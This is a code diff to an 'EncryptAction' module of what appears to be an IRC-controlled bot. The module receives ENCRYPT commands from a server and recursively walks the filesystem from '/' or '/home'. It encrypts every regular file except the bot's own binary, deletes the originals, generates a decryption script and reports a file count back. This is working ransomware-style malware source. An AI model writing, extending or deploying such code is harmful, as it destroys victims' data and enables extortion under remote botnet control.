@@ -1,9 +1,6 @@
 #include "EncryptAction.hpp"
-#include <filesystem>
 
-namespace fs = std::filesystem;
-
-bool isValidAlgorithm(const char* cString) {
+bool isValidEncAlgorithm(const char* cString) {
     if (GeneralUtils::cStrAreEqual(cString, "AES-128")) {
         return true;
     } else if (GeneralUtils::cStrAreEqual(cString, "AES-192")) {
@@ -17,9 +14,7 @@ bool isValidAlgorithm(const char* cString) {
 bool isValidStartDir(const char* cString) {
     if (GeneralUtils::cStrAreEqual(cString, "ROOT")) {
         return true;
-    } else if (GeneralUtils::cStrAreEqual(cString, "HOME-ALL")) {
-        return true;
-    } else if (GeneralUtils::cStrAreEqual(cString, "HOME-USER")) {
+    } else if (GeneralUtils::cStrAreEqual(cString, "HOME")) {
         return true;
     }
     return false;
@@ -34,6 +29,11 @@ bool isValidCryptoType(const char* cString) {
     return false;
 }
 
+bool isNotBotFile(std::string fileName) {
+    const char* basename = GeneralUtils::getFileBaseName(fileName);
+    return !GeneralUtils::cStrAreEqual(basename, "irc_bot"); // TEMP: pass exe name to this file
+}
+
 std::string getParentDirectory(const std::string& path) {
     size_t pos = path.find_last_of("/\\");
     if (pos == std::string::npos || pos == 0) {
@@ -43,13 +43,18 @@ std::string getParentDirectory(const std::string& path) {
 }
 
 
-EncryptAction::EncryptAction(std::vector<std::string> actionParams, IrcClient* ircClient) 
-    : actionParams(actionParams), ircClient(ircClient) {
+EncryptAction::EncryptAction(std::vector<std::string> actionParams) 
+    : actionParams(actionParams) {
+    this->msgToServer = "";
     this->checkParams();
 }
 
 ActionType EncryptAction::getActionType() {
     return ActionType::ENCRYPT;
+}
+
+std::string EncryptAction::getMessage() {
+    return msgToServer;
 }
 
 void EncryptAction::execute() { 
@@ -58,81 +63,81 @@ void EncryptAction::execute() {
         return;
     }
     const char* algo = actionParams[ALGO_IDX].c_str();
-    this->isDecryption = GeneralUtils::cStrAreEqual(actionParams[START_DIR_IDX].c_str(), "DEC");
+    this->isDecryption = GeneralUtils::cStrAreEqual(actionParams[CRYPTO_TYPE_IDX].c_str(), "DEC");
     fs::path startDir = determineStartDir(actionParams[START_DIR_IDX].c_str());
-    CryptoManger cryptoManager(algo);
-    this->cryptoManger = cryptoManager;
+    CryptoManager newCryptoManager(algo);
 
-    std::string result = traverseFileSystem(startDir);
-    ircClient->sendCommand(result);
+    std::string result = traverseFileSystem(startDir, newCryptoManager);
+    if (!isDecryption) {
+        GenDecryptionScript::generateScript();
+    }
+    this->msgToServer = result;
+    printf("ENCRYPT ACTION Result: %s\n", result.c_str());
 }
 
-char* EncryptAction::determineStartDir(const char* cString) {
-    if (isDecryption) {
-        return "/";
-    }
+std::string EncryptAction::determineStartDir(const char* cString) {
     if (GeneralUtils::cStrAreEqual(cString, "ROOT")) {
-        return "/";
+        return std::string("/");
     } else {
-        const char* homeDir = std::getenv("HOME");
-        if (homeDir) {
-            if (GeneralUtils::cStrAreEqual(cString, "HOME-ALL")) {
-                return getParentDirectory(std::string(homeDir)).c_str();
-            } else if (GeneralUtils::cStrAreEqual(cString, "HOME-USER")) {
-                return homeDir;
-            }
-        } else {
-            return "/home";
-        }
+        return std::string("/home");
     }
 }
 
-std::string EncryptAction::traverseFileSystem(const fs::path& startDir) {
+std::string EncryptAction::traverseFileSystem(const fs::path& startDir, CryptoManager cryptoManager) {
     try {
-        if (!fs::exists(dirPath) || !fs::is_directory(dirPath)) {
-            printf("Not a dir or doesnt exist\n");
-            return std::string("Unable to encrypt/decrypt\n");
+        if (!fs::exists(startDir) || !fs::is_directory(startDir)) {
+            return ERROR_MSG;
         } 
     } catch (const fs::filesystem_error& e) {
-        std::cerr << "Filesystem error: " << e.what() << std::endl;
-        return std::string("Unable to encrypt/decrypt\n");
+        return ERROR_MSG;
     } catch (const std::exception& e) {
-        std::cerr << "General error: " << e.what() << std::endl;
+        return ERROR_MSG;
     }
 
     int count = 0;
     for (const auto& entry : fs::recursive_directory_iterator(startDir, fs::directory_options::skip_permission_denied)) {
         try {
             if (fs::is_regular_file(entry.status())) {
-                if (entry.path().extension() != "irc_bot") { // TODO: change to actual executable file name
+                if (isNotBotFile(entry.path().string())) {
+                    printf("Filename: %s\n", entry.path().c_str());
                     try {
-                        if (isDecryption && entry.path().extension() == ".cry") {
-                            cryptoManger.decryptFile(entry.path().string());
+                        if (isDecryption) {
+                            if (entry.path().extension() == ".cry") {
+                                printf("THIS HIT\n");
+                                cryptoManager.decryptFile(entry.path().string());
+                                fs::remove(entry.path());
+                                count++;
+                            }
                         } else {
-                            cryptoManger.encryptFile(entry.path().string());
+                            if (entry.path().extension() != ".cry") { // TODO: find better way of not double-encrypting files
+                                cryptoManager.encryptFile(entry.path().string());
+                                fs::remove(entry.path());
+                                count++;
+                            }
                         }
-                        fs::remove(entry.path());
-                        count++;
                     } catch (const std::exception& e) {
                         continue;
                     }
                 }
             }
         } catch (const fs::filesystem_error& e) {
-            std::cerr << "Filesystem error: " << e.what() << " for path: " << entry.path().string() << std::endl;
+            continue;
         } catch (const std::exception& e) {
-            std::cerr << "General error: " << e.what() << " for path: " << entry.path().string() << std::endl;
+            continue;
         }
     }
+    std::ostringstream oss;
     if (isDecryption) {
-        return std::string("%d file(s) decrypted", count);
-    } 
-    return std::string("%d file(s) encrypted", count);
+        oss << count << " file(s) decrypted";
+    } else {
+        oss << count << " file(s) encrypted";
+    }
+    return oss.str();
 } 
 
 /*
     ENCRYPT Command Syntax:
-        ENCRYPT <ENC_ALGORITHM> <ROOT|HOME-ALL|HOME-USER> <ENC|DEC>
+        ENCRYPT <ENC_ALGORITHM> <ROOT|HOME> <ENC|DEC>
 */
 void EncryptAction::checkParams() {
     if (actionParams.size() - 3 != PARAM_COUNT) {
@@ -145,7 +150,7 @@ void EncryptAction::checkParams() {
         return;
     }
 
-    if(!isValidAlgorithm(actionParams[ALGO_IDX].c_str())) {
+    if(!isValidEncAlgorithm(actionParams[ALGO_IDX].c_str())) {
         isValid = false;
         return;
     }
